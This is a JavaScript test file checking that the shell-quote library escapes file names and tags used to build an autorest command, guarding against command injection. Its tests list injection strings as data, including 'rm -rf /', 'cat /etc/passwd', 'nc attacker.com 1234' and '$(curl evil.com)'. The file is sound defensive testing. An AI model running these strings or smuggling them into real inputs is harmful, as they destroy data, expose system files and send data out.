import * as assert from "assert"
import { quote } from "shell-quote"

// Test the shell-quote library integration to ensure our security fix works correctly
test("shell escaping with quote function", () => {
  // Test normal filenames (should not be escaped)
  const normalFile = "simple-file.json"
  const escapedNormal = quote([normalFile])
  assert.strictEqual(escapedNormal, normalFile)

  // Test filenames with spaces (should be quoted)
  const fileWithSpaces = "file with spaces.json"
  const escapedSpaces = quote([fileWithSpaces])
  assert.strictEqual(escapedSpaces, "'file with spaces.json'")

  // Test dangerous shell metacharacters (should be escaped)
  const dangerousFile = "file;with&dangerous|chars$.json"
  const escapedDangerous = quote([dangerousFile])
  // shell-quote uses backslash escaping for certain characters
  assert.ok(escapedDangerous.includes("\\;"))
  assert.ok(escapedDangerous.includes("\\&"))
  assert.ok(escapedDangerous.includes("\\|"))
  assert.ok(escapedDangerous.includes("\\$"))
})

test("autorest command construction with dangerous inputs", () => {
  // Simulate the command construction logic from processViaAutoRest
  const autoRestPath = "/usr/bin/autorest"
  
  // Test with dangerous file paths
  const dangerousSwaggerPath = "/tmp/file;rm -rf /.json"
  const dangerousOutputFile = "output;evil&command"
  const dangerousTag = "tag$(evil)"

  // Build command like in processViaAutoRest with escaping
  const autoRestCmd = autoRestPath + " " + quote([dangerousSwaggerPath]) + " --v2 --tag=" + quote([dangerousTag]) + " --output-artifact=swagger-document.json --output-artifact=swagger-document.map --output-file=" + quote([dangerousOutputFile])

  // Verify that dangerous parts are properly escaped/quoted
  // Files with spaces get quoted, dangerous chars get backslash-escaped
  assert.ok(autoRestCmd.includes("'/tmp/file;rm -rf /.json'")) // quoted because of spaces
  assert.ok(autoRestCmd.includes("output\\;evil\\&command")) // backslash-escaped
  assert.ok(autoRestCmd.includes("tag\\$\\(evil\\)")) // backslash-escaped
  
  // Verify that the command structure is maintained
  assert.ok(autoRestCmd.includes("--v2"))
  assert.ok(autoRestCmd.includes("--tag="))
  assert.ok(autoRestCmd.includes("--output-file="))
})

test("autorest command construction without tag", () => {
  const autoRestPath = "/usr/bin/autorest"
  const swaggerPath = "/tmp/test file.json"
  const outputFile = "output file"
  const outputFolder = "/tmp/output folder"

  // Build command without tag (different structure)
  const autoRestCmd = `${autoRestPath} --v2 --input-file=${quote([swaggerPath])} --output-artifact=swagger-document.json` +
    ` --output-artifact=swagger-document.map --output-file=${quote([outputFile])} --output-folder=${quote([outputFolder])}`

  // Verify correct command structure for non-tagged case
  assert.ok(autoRestCmd.includes("--input-file="))
  assert.ok(!autoRestCmd.includes("--tag="))
  assert.ok(autoRestCmd.includes("--v2"))
  
  // Verify spaces are properly quoted
  assert.ok(autoRestCmd.includes("'/tmp/test file.json'"))
  assert.ok(autoRestCmd.includes("'output file'"))
  assert.ok(autoRestCmd.includes("'/tmp/output folder'"))
})

test("command injection prevention", () => {
  // Test various command injection attempts
  const injectionAttempts = [
    "file.json; rm -rf /",
    "file.json && cat /etc/passwd",
    "file.json | nc attacker.com 1234",
    "file.json $(curl evil.com)",
    "file.json `wget malware.com`",
    "file.json & background-evil-command"
  ]

  injectionAttempts.forEach(attempt => {
    const escaped = quote([attempt])
    // Verify that the dangerous parts cannot be executed as separate commands
    // They should either be quoted or have dangerous chars escaped
    const hasDangerousUnescaped = /[^\\][;&|$`]/.test(escaped) && !escaped.includes("'")
    assert.ok(!hasDangerousUnescaped, `Injection attempt not properly escaped: ${attempt} -> ${escaped}`)
  })
})

test("edge cases and special characters", () => {
  // Test empty string
  assert.strictEqual(quote([""]), "''")
  
  // Test string with only spaces
  assert.strictEqual(quote(["   "]), "'   '")
  
  // Test string with newlines
  const withNewlines = "file\nwith\nnewlines.json"
  const escapedNewlines = quote([withNewlines])
  // Should be safely handled
  assert.ok(typeof escapedNewlines === "string")
  
  // Test unicode and special chars
  const unicodeFile = "файл.json"
  const escapedUnicode = quote([unicodeFile])
  assert.ok(escapedUnicode.includes("файл"))
})
